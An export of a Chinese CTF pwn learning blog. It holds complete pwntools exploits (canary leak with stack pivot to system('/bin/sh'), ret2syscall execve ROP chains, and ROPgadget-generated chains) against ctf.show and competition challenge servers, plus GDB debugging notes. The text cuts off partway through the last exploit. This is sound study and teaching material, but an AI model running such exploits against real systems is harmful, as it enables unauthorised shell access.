class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(sh_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../images/polarwp/momcanary.png" alt="1"></p><p>可以看到此时第三个read发送了0x18的数据canary距离输入是有17个32位地址的距离，也就是17*4&#x3D;68-0x18&#x3D;44个字节，也可以用0x50-0x0C-0x18&#x3D;44</p><p>接着完善payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=b&#x27;aaaa&#x27;+p32(system_addr)+p32(0)+p32(sh_addr)+b&#x27;/bin/sh\x00&#x27;+b&#x27;a&#x27;*44+p32(canary)+b&#x27;a&#x27;*(0x0C-4)+p32(s_addr)+p32(leave_ret)</span><br></pre></td></tr></table></figure><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2078</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_addr=<span class="number">0x08048490</span></span><br><span class="line">leave_ret=<span class="number">0x08048538</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span> (io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>)+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">s_addr=ebp_addr-<span class="number">0x60</span></span><br><span class="line">sh_addr=s_addr+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(sh_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0C</span>-<span class="number">4</span>)+p32(s_addr)+p32(leave_ret)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>到这里就浮现完本次比赛的所有栈题了，堆因为还没学概念就没浮现收获还是很多的~~</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB调试</title>
      <link href="/2025/03/20/GDB%E8%B0%83%E8%AF%95/"/>
      <url>/2025/03/20/GDB%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h1><p>这篇文章用于记录gdb调试的学习</p><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn <span class="comment">#开始调试</span></span><br><span class="line">b 函数名 <span class="comment">#在指定函数处打断点</span></span><br><span class="line">b* 地址 <span class="comment">#在指定位置处设置断点</span></span><br><span class="line">b* <span class="variable">$rebase</span>(要下断点的偏移) <span class="comment">#有PIE时这样下断点得先run起来</span></span><br><span class="line">n     <span class="comment">#c语言级的断点定位(走得快一点)</span></span><br><span class="line">ni    <span class="comment">#汇编级别的断点定位(走得精细一点)</span></span><br><span class="line">s/si  <span class="comment">#s与si的区别和n/ni相同,不同点在于s/si会进入函数内部</span></span><br><span class="line">fibi  <span class="comment">#跳出函数</span></span><br><span class="line">r     <span class="comment">#运行</span></span><br><span class="line">c     <span class="comment">#让程序继续运行</span></span><br><span class="line">stack 30 <span class="comment">#查看此时栈中的内容</span></span><br><span class="line">x/gx  <span class="comment">#计算偏移</span></span><br><span class="line">x/1gx <span class="variable">$rsp</span>+0x10 <span class="comment">#查看rsp+0x10处的值</span></span><br><span class="line">start <span class="comment">#开始程序</span></span><br></pre></td></tr></table></figure><p>给exp加gdb调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]<span class="comment">#左右分屏</span></span><br><span class="line">gdb.attach(io)<span class="comment">#放到想要在exp中停止的位置，程序在运行时候会停止在该处进行调试</span></span><br></pre></td></tr></table></figure><p>此处加了一个小插件tmux可以双栏显示调试，更方便查看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update </span><br><span class="line"><span class="comment">#确保包管理器是最新的</span></span><br><span class="line"><span class="built_in">sudo</span> apt install tmux</span><br><span class="line"><span class="comment">#安装tmux</span></span><br></pre></td></tr></table></figure><p>终端输入tmux即可启动</p><h2 id="在gdb调试中一般要注意三个区域"><a href="#在gdb调试中一般要注意三个区域" class="headerlink" title="在gdb调试中一般要注意三个区域"></a>在gdb调试中一般要注意三个区域</h2><p>区域1：当前状态下各个寄存器中存储的值（可称之为寄存器区）</p><p>区域2：当前执行步骤所执行的汇编指令以及该指令附近的汇编语句（可称为程序汇编区）</p><p>区域3：从rsp往下部分栈中的情况（可称为栈区）</p><p><img src="/../images/GDB%E8%B0%83%E8%AF%95/gdb.png" alt="1"></p><h2 id="利用GDB计算偏移量"><a href="#利用GDB计算偏移量" class="headerlink" title="利用GDB计算偏移量"></a>利用GDB计算偏移量</h2><p>32位：返回地址的偏移为 ebp地址-esp地址-esp距起始位置的距离+4(ebp)</p><p>以这题为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048E8F 8D 44 24 1C                   lea     eax, [esp+1Ch]</span><br><span class="line">.text:08048E93 89 04 24                      mov     [esp], eax</span><br><span class="line">.text:08048E96 E8 B5 67 00 00                call    gets</span><br></pre></td></tr></table></figure><p><img src="/../images/ret2syscall/gdb.png" alt="1"></p><p>使用x&#x2F;gx计算0xffffd1d8-0xfffd150-0x1C+4&#x3D;112</p><p>64位同理但是是+8</p><h2 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h2><p>无PIE时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main <span class="comment">#main可换成任意函数</span></span><br><span class="line">b* 地址 </span><br></pre></td></tr></table></figure><p>有PIE时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b* <span class="variable">$rebase</span>(要下断点的偏移)</span><br></pre></td></tr></table></figure><p>使用这个指令前得先让程序跑起来，gdb才能知道elf的基地址，偏移可以在IDA中查看，IDA中此时看到的地址即为偏移</p><h2 id="GDB放置在函数里时如何使用"><a href="#GDB放置在函数里时如何使用" class="headerlink" title="GDB放置在函数里时如何使用"></a>GDB放置在函数里时如何使用</h2><p>gdb放置在exp里时通常可以查看我们的payload传输进去之后程序执行流的变化或调试寄存器的信息</p><p>可以以下几种形式进行调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io)  <span class="comment">#放在哪里断点就下在哪里一般放在发送payload之前</span></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0xaaaaa&quot;</span>) <span class="comment">#在程序的0xaaaaa处下断点</span></span><br></pre></td></tr></table></figure><p>注意有时我们还没启动gdb程序执行流就已经关闭就会报错这样的信息</p><p><img src="/../images/GDB%E8%B0%83%E8%AF%95/bug.png" alt="1"></p><p>显示没有那个进程，debug输出可以看到我们的payload是被发送出去了的，这种情况就是脚本执行太快了gdb还没来得及启动就运行结束了，加上sleep(1)在发送或接收脚本之前即可解决</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2syscall</title>
      <link href="/2025/03/20/ret2syscall/"/>
      <url>/2025/03/20/ret2syscall/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>其实在ret2shellcod里我们就已经使用过ret2syscall的类似解法，也就是系统调用但只用了orw，这篇文章来介绍静态链接的elf文件使用gadget构造系统调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)拿shell</p><p>对于i386程序想要系统调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)需要达成以下条件：</p><ul><li>系统调用号，即 eax 应该为 0xb，因为是execve所以是0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li><li>最后int 0x80 系统调用</li></ul><p>接下来就用ROPgadget来找对应gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ecx&#x27;</span></span><br><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;edx&#x27;</span></span><br><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">ROPgadget --binary pwn --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>找齐之后可以开始构造payload</p><h2 id="pwn71"><a href="#pwn71" class="headerlink" title="pwn71"></a>pwn71</h2><p>该题要注意偏移ida上给出的有误故使用gdb调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn</span><br><span class="line">b main下断点</span><br><span class="line">r运行</span><br><span class="line">c到输出位置 看ebp和esp此时的地址</span><br><span class="line">x/gx 地址运算</span><br></pre></td></tr></table></figure><p>通过观察汇编可知此时起始地址相对于esp的偏移为0x1C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:08048E8F 8D 44 24 1C                   lea     eax, [esp+1Ch]</span><br><span class="line">.text:08048E93 89 04 24                      mov     [esp], eax</span><br><span class="line">.text:08048E96 E8 B5 67 00 00                call    gets</span><br></pre></td></tr></table></figure><p>故返回地址的偏移为 ebp地址-esp地址-esp距起始位置的距离+4(ebp)</p><p><img src="/../images/ret2syscall/gdb.png" alt="1"></p><p>即0xffffd1d8-0xffffd150-0x1c+4&#x3D;112</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28162</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="number">0x080be408</span></span><br><span class="line">pop_eax_ret=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret=<span class="number">0x0806eb90</span></span><br><span class="line">int_0x80=<span class="number">0x08049421</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn72-多系统调用"><a href="#pwn72-多系统调用" class="headerlink" title="pwn72 多系统调用"></a>pwn72 多系统调用</h2><p>该题依旧是静态编译，但没有&#x2F;bin&#x2F;sh字符需要先调用read读入一个&#x2F;bin&#x2F;sh再进行系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28118</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eb000</span></span><br><span class="line">pop_eax_ret=<span class="number">0x080bb2c6</span></span><br><span class="line">pop_edx_ecx_ebx_ret=<span class="number">0x0806ecb0</span></span><br><span class="line">int_0x80=<span class="number">0x0806f350</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0x3</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0x10</span>)+p32(bss)+p32(<span class="number">0</span>)+p32(int_0x80) <span class="comment">#0x3是read的系统调用号 0是标准输入</span></span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss)+p32(int_0x80)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">bin_sh=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(bin_sh)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn73一把梭"><a href="#pwn73一把梭" class="headerlink" title="pwn73一把梭"></a>pwn73一把梭</h2><p>本来已经用ROPgadget写出一把梭了但是看着怪怪的以为没跑出来回去用老方法没打通不知道是哪有问题</p><p>该题有明显栈溢出，静态编译</p><p>使用该指令自动构造ROP链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">ROP chain generation</span><br><span class="line">===========================================================</span><br><span class="line"></span><br><span class="line">- Step 1 -- Write-what-where gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: 0x8051035 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">[+] Gadget found: 0x8048433 pop esi ; ret</span><br><span class="line">[+] Gadget found: 0x8048480 pop edi ; ret</span><br><span class="line">[-] Can<span class="string">&#x27;t find the &#x27;</span>xor edi, edi<span class="string">&#x27; gadget. Try with another &#x27;</span>mov [r], r<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Gadget found: 0x80549db mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="string">[+] Gadget found: 0x806f02a pop edx ; ret</span></span><br><span class="line"><span class="string">[+] Gadget found: 0x80b81c6 pop eax ; ret</span></span><br><span class="line"><span class="string">[+] Gadget found: 0x8049303 xor eax, eax ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- Step 2 -- Init syscall number gadgets</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Gadget found: 0x8049303 xor eax, eax ; ret</span></span><br><span class="line"><span class="string">[+] Gadget found: 0x807a86f inc eax ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- Step 3 -- Init syscall arguments gadgets</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Gadget found: 0x80481c9 pop ebx ; ret</span></span><br><span class="line"><span class="string">[+] Gadget found: 0x80de955 pop ecx ; ret</span></span><br><span class="line"><span class="string">[+] Gadget found: 0x806f02a pop edx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- Step 4 -- Syscall gadget</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Gadget found: 0x806cc25 int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- Step 5 -- Build the ROP chain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#!/usr/bin/env python2</span></span><br><span class="line"><span class="string"># execve generated by ROPgadget</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from struct import pack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Padding goes here</span></span><br><span class="line"><span class="string">p = &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0806f02a) # pop edx ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080ea060) # @ .data</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080b81c6) # pop eax ; ret</span></span><br><span class="line"><span class="string">p += &#x27;</span>/bin<span class="string">&#x27;</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0806f02a) # pop edx ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080ea064) # @ .data + 4</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080b81c6) # pop eax ; ret</span></span><br><span class="line"><span class="string">p += &#x27;</span>//sh<span class="string">&#x27;</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0806f02a) # pop edx ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080ea068) # @ .data + 8</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x08049303) # xor eax, eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080549db) # mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080481c9) # pop ebx ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080ea060) # @ .data</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080de955) # pop ecx ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080ea068) # @ .data + 8</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0806f02a) # pop edx ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x080ea068) # @ .data + 8</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x08049303) # xor eax, eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0807a86f) # inc eax ; ret</span></span><br><span class="line"><span class="string">p += pack(&#x27;</span>&lt;I<span class="string">&#x27;, 0x0806cc25) # int 0x80</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28247</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">28</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x0806f02a&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080ea060&#x27;</span>,<span class="number">16</span>)) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080b81c6&#x27;</span>,<span class="number">16</span>)) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">int</span>(<span class="string">&#x27;0x080549db&#x27;</span>,<span class="number">16</span>)) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += 